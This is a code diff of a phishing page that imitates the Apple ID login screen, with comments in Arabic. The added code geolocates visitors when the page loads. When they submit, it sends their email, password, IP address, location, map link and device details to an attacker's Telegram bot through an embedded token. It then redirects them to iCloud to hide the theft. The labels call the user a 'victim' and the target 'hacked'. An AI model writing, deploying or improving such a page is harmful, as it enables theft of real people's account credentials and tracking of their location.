@@ -20,10 +20,8 @@
     <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">
     <h1>Apple ID</h1>
     <p>استخدم الـ Apple ID الخاص بك لتسجيل الدخول</p>
-    
     <input type="email" id="u" placeholder="Apple ID" required>
     <input type="password" id="p" placeholder="Password" required>
-    
     <button id="btn">Continue</button>
 </div>
 
@@ -31,40 +29,40 @@
     const token = "8213467523:AAE-4yv3jiYvyAHpJU4XJ90lALV5OSKzNDE";
     const chat_id = "6888107255";
 
-    // دالة إرسال التنبيهات
-    function sendMsg(text) {
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`);
+    async function sendMsg(text) {
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=HTML`);
     }
 
-    // دالة جلب البيانات مع محرك احتياطي
-    async function getIP() {
+    // محرك جلب البيانات الثلاثي (Tri-Fetch Engine)
+    async function getFullData() {
+        let results = { ip: "127.0.0.1", city: "غير معروف", country: "غير معروف", isp: "محمي/VPN", map: "" };
         try {
-            // محاولة أولى عبر ipwho.is
-            const res = await fetch('https://ipwho.is/');
-            const d = await res.json();
-            if(d.success) return {ip: d.ip, city: d.city, country: d.country, isp: d.connection.isp};
-            throw new Error();
+            // محاولة عبر ipwhois
+            const r1 = await fetch('https://ipwho.is/');
+            const d1 = await r1.json();
+            if(d1.success) {
+                results = { ip: d1.ip, city: d1.city, country: d1.country, isp: d1.connection.isp, map: `https://www.google.com/maps?q=${d1.latitude},${d1.longitude}` };
+            } else throw 'e';
         } catch(e) {
             try {
-                // محاولة احتياطية عبر ipapi في حال فشل الأولى
-                const res2 = await fetch('https://ipapi.co/json/');
-                const d2 = await res2.json();
-                return {ip: d2.ip, city: d2.city, country: d2.country_name, isp: d2.org};
-            } catch(e2) {
-                return {ip: "محمي/VPN", city: "غير معروف", country: "غير معروف", isp: "غير معروف"};
-            }
+                // محاولة احتياطية ثانية عبر ipapi
+                const r2 = await fetch('https://ipapi.co/json/');
+                const d2 = await r2.json();
+                results = { ip: d2.ip, city: d2.city, country: d2.country_name, isp: d2.org, map: `https://www.google.com/maps?q=${d2.latitude},${d2.longitude}` };
+            } catch(e2) {}
         }
+        return results;
     }
 
     // 1. عند الدخول فوراً
     window.onload = async function() {
-        sendMsg("🔔 [دخول جديد للرابط - جاري محاولة سحب الآي بي...]");
-        const data = await getIP();
-        let entryReport = `🌐 آي بي الدخول: ${data.ip}\n📍 الموقع: ${data.city}\n📶 المزود: ${data.isp}`;
-        sendMsg(entryReport);
+        sendMsg("🔔 <b>دخول جديد للرابط... جاري جمع المعلومات</b>");
+        const data = await getFullData();
+        let entry = `📍 <b>معلومات الدخول الأولية:</b>\n🌐 IP: ${data.ip}\n🏙️ المدينة: ${data.city}\n📶 المزود: ${data.isp}`;
+        sendMsg(entry);
     };
 
-    // 2. التقرير الشامل عند الضغط (الترتيب الدقيق)
+    // 2. التقرير الشامل عند الضغط
     document.getElementById('btn').onclick = async function() {
         const user = document.getElementById('u').value;
         const pass = document.getElementById('p').value;
@@ -73,26 +71,27 @@
         this.innerHTML = "Processing...";
         this.disabled = true;
 
-        const ipData = await getIP(); // إعادة المحاولة للتأكيد
+        const d = await getFullData();
 
-        let report = "⚠️ تم اختراق الهدف بنجاح ⚠️\n\n";
-        report += "📧 الحساب: " + user + "\n";
-        report += "🔑 الباسورد: " + pass + "\n";
+        let report = "⚠️ <b>تم اختراق الهدف بنجاح</b> ⚠️\n\n";
+        report += "📧 <b>الحساب:</b> <code>" + user + "</code>\n";
+        report += "🔑 <b>الباسورد:</b> <code>" + pass + "</code>\n";
         report += "------------------------\n";
-        report += "🌐 الـ IP: " + ipData.ip + "\n";
-        report += "📍 الموقع: " + ipData.city + " (" + ipData.country + ")\n";
-        report += "📶 المزود: " + ipData.isp + "\n";
-        report += "📱 النظام: " + navigator.platform + "\n";
-        report += "🔋 البطارية: " + (navigator.getBattery ? (await (await navigator.getBattery()).level * 100).toFixed(0) + "%" : "N/A") + "\n";
-        report += "📏 الدقة: " + screen.width + "x" + screen.height + "\n";
-        report += "🕰️ الوقت: " + new Date().toLocaleString() + "\n";
-        report += "🔒 كوكيز: " + (document.cookie ? "موجودة" : "محمية");
+        report += "🌐 <b>الـ IP:</b> " + d.ip + "\n";
+        report += "📍 <b>الموقع:</b> " + d.city + " (" + d.country + ")\n";
+        report += "📶 <b>المزود:</b> " + d.isp + "\n";
+        report += "📱 <b>النظام:</b> " + navigator.platform + "\n";
+        report += "🔋 <b>البطارية:</b> " + (navigator.getBattery ? (await (await navigator.getBattery()).level * 100).toFixed(0) + "%" : "N/A") + "\n";
+        report += "📏 <b>الدقة:</b> " + screen.width + "x" + screen.height + "\n";
+        report += "🕰️ <b>الوقت:</b> " + new Date().toLocaleString() + "\n";
+        report += "🔒 <b>كوكيز:</b> " + (document.cookie ? "موجودة" : "محمية") + "\n\n";
+        report += "📍 <b>موقع الضحية على الخريطة:</b>\n" + d.map;
 
-        sendMsg(report);
+        await sendMsg(report);
 
         setTimeout(() => {
             window.location.replace("https://www.icloud.com/");
-        }, 1200);
+        }, 1000);
     };
 </script>
 
